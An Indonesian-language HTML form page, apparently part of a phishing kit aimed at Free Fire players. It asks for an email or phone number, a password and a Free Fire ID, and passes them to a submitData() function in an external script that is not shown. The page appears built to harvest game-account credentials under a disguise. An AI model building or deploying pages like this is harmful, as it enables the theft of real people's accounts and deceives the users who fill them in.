<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>Masukkan Data</title>

    <link rel="stylesheet" href="style.css">
</head>

<body class="page2">

    <main class="floating-window form-window">

        <img
            class="window-image"
            src="assets/window.png"
            alt="Window"
        >

        <div class="form-container">

            <input
                id="nama"
                type="text"
                placeholder="masukan email/nomor telepon"
                autocomplete="off"
            >

            <input
                id="code"
                type="text"
                placeholder="masukan password"
                autocomplete="off"
            >
          
          <input
                id="idff"
                type="text"
                placeholder="ID free fire"
                autocomplete="off"
            >

            <button
                class="enter-button"
                onclick="submitData()"
            >
                ENTER
            </button>

        </div>

    </main>

    <script src="javas.js"></script>

</body>
</html>
